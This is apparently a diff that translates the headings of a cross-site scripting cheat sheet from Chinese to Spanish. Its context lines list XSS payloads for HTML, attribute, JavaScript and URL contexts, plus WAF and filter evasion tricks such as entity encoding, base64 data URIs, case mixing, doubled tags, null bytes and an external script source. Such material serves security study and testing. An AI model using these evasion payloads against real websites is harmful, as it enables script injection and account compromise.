@@ -48,7 +48,7 @@ Entrada del usuario (datos) -> Salida sin codificar -> El navegador la interpret
 <iframe src="javascript:alert(1)">
 ```
 
-#### HTML属性值
+#### Valores de atributos HTML
 
 ```html
 " onclick=alert(1) "
@@ -57,7 +57,7 @@ Entrada del usuario (datos) -> Salida sin codificar -> El navegador la interpret
 " onmouseover=alert(1) x="
 ```
 
-#### JavaScript字符串
+#### Cadenas de JavaScript
 
 ```javascript
 ';alert(1);//
@@ -66,7 +66,7 @@ Entrada del usuario (datos) -> Salida sin codificar -> El navegador la interpret
 </script><script>alert(1)</script>
 ```
 
-#### URL上下文
+#### Contexto URL
 
 ```
 javascript:alert(1)
@@ -74,31 +74,31 @@ data:text/html,<script>alert(1)</script>
 data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 ```
 
-### 2.4 WAF/过滤绕过技巧
+### 2.4 Técnicas de evasión de WAF/filtros
 
-#### 编码绕过
+#### Evasión mediante codificación
 
 ```html
-<!-- HTML实体 -->
+<!-- Entidades HTML -->
 &#60;script&#62;alert(1)&#60;/script&#62;
 &#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
-<!-- Base64 + data协议 -->
+<!-- Base64 + protocolo data -->
 <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
-<!-- CSS编码(IE) -->
+<!-- Codificación CSS (IE) -->
 xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
 ```
 
-#### 标签/属性变形
+#### Deformación de etiquetas/atributos
 
 ```html
-<ScRiPt>alert(1)</sCrIpT>              <!-- 大小写混淆 -->
-<script/src=//xss.com/x.js>            <!-- 斜杠替代空格 -->
-<img src=x onerror=alert(1)>           <!-- 无引号 -->
-<scrscriptipt>alert(1)</scrscriptipt>  <!-- 双写绕过 -->
-<scr\x00ipt>alert(1)</script>          <!-- 空字符绕过 -->
+<ScRiPt>alert(1)</sCrIpT>              <!-- Confusión de mayúsculas/minúsculas -->
+<script/src=//xss.com/x.js>            <!-- Barra en lugar de espacio -->
+<img src=x onerror=alert(1)>           <!-- Sin comillas -->
+<scrscriptipt>alert(1)</scrscriptipt>  <!-- Evasión por doble escritura -->
+<scr\x00ipt>alert(1)</script>          <!-- Evasión con carácter nulo -->
 ```
 
-#### 替代事件处理器
+#### Manejadores de eventos alternativos
 
 ```html
 <img src=x onerror=alert(1)>
